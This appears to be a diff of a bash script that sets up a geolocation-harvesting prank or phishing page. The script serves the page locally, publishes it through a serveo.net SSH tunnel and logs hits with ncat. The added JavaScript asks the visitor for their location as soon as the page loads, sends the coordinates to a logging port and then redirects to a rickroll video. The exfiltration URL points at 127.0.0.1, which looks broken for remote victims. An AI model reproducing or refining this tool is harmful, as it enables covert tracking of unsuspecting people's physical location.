@@ -1,86 +1,77 @@
 #!/bin/bash
 
-# Ask user which port to use
-read -p "[?] Enter port to use for local server (default 8080): " PORT
-PORT=${PORT:-8080}
+clear
+
+# Prompt for server port
+read -p "[?] Enter port to use for local server (default 8080): " SERVER_PORT
+SERVER_PORT=${SERVER_PORT:-8080}
+
+# Prompt for ncat port
+read -p "[?] Enter port to use for logging with Ncat (must differ, default 9999): " NCAT_PORT
+NCAT_PORT=${NCAT_PORT:-9999}
 
 WEB_DIR="$HOME/webpage"
-HTML_FILE="$WEB_DIR/index.html"
 
-# Kill previous sessions
-echo "[*] Killing existing processes on port $PORT..."
-fuser -k ${PORT}/tcp &>/dev/null
-pkill -f "serveo.net" &>/dev/null
-pkill -f "python3 -m http.server" &>/dev/null
-pkill -f "ncat" &>/dev/null
+echo "[*] Killing existing processes..."
+pkill -f "python3 -m http.server" 2>/dev/null
+pkill -f ncat 2>/dev/null
+sleep 1
 
-# Prepare webpage directory
 echo "[*] Creating/clearing web directory: $WEB_DIR"
 mkdir -p "$WEB_DIR"
-rm -f "$HTML_FILE"
+rm -f "$WEB_DIR/index.html"
+cd "$WEB_DIR" || exit 1
 
-# Create HTML payload
 echo "[*] Creating payload HTML..."
-cat <<EOF > "$HTML_FILE"
+cat > index.html <<EOF
 <!DOCTYPE html>
 <html>
 <head>
-    <title>I See You!</title>
-    <style>
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: sans-serif;
-            text-align: center;
-            margin-top: 100px;
+    <title>I See You</title>
+    <script>
+        function redirectToRickRoll(position) {
+            fetch('http://127.0.0.1:$NCAT_PORT/log?loc=' + position.coords.latitude + ',' + position.coords.longitude);
+            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
         }
-    </style>
+        function failLocation() {
+            alert("Location access denied.");
+        }
+        window.onload = () => {
+            navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
+        };
+    </script>
 </head>
 <body>
-    <h1>Hold on...</h1>
-    <script>
-        navigator.geolocation.getCurrentPosition(function(position) {
-            // Redirect whether location is allowed or denied
-            window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
-        }, function(error) {
-            window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
-        });
-    </script>
+    <h1>Loading...</h1>
 </body>
 </html>
 EOF
 
-# Start HTTP server
-cd "$WEB_DIR" || exit 1
-echo "[*] Starting local server on port $PORT..."
-python3 -m http.server "$PORT" > /dev/null 2>&1 &
+echo "[*] Starting local server on port $SERVER_PORT..."
+python3 -m http.server "$SERVER_PORT" > /dev/null 2>&1 &
 SERVER_PID=$!
+sleep 2
 echo "[+] Python server running (PID $SERVER_PID)"
 
-# Start Serveo tunnel (needs ssh installed)
 echo "[*] Starting Serveo tunnel..."
-ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT serveo.net > serveo.log 2>&1 &
+ssh -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.log 2>&1 &
 SSH_PID=$!
-
-# Wait and extract public URL
 sleep 5
-PUBLIC_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.serveo.net" serveo.log | head -n 1)
 
-if [ -n "$PUBLIC_URL" ]; then
-    echo "[✓] Public URL: $PUBLIC_URL"
+TUNNEL_URL=$(grep -oE "https://[a-zA-Z0-9]+\.serveo.net" serveo.log | head -n1)
+if [ -n "$TUNNEL_URL" ]; then
+    echo "[✓] Public URL: $TUNNEL_URL"
 else
-    echo "[✗] Failed to obtain Serveo URL. Try again."
-    kill $SERVER_PID $SSH_PID 2>/dev/null
+    echo "[✗] Failed to get Serveo URL."
+    kill $SERVER_PID $SSH_PID
     exit 1
 fi
 
-# Start logging connections with ncat (optional)
-echo "[*] Logging connections with ncat on port $PORT..."
-ncat -l -k -p $PORT --keep-open --exec "/bin/cat" > access.log &
+echo "[*] Logging connections with ncat on port $NCAT_PORT..."
+ncat -lvkp "$NCAT_PORT" &
 NCAT_PID=$!
 
-# Trap for cleanup
-trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID $NCAT_PID 2>/dev/null' EXIT
+trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID $NCAT_PID 2>/dev/null; exit' INT
 
 echo "[*] Press Ctrl+C to stop."
 wait
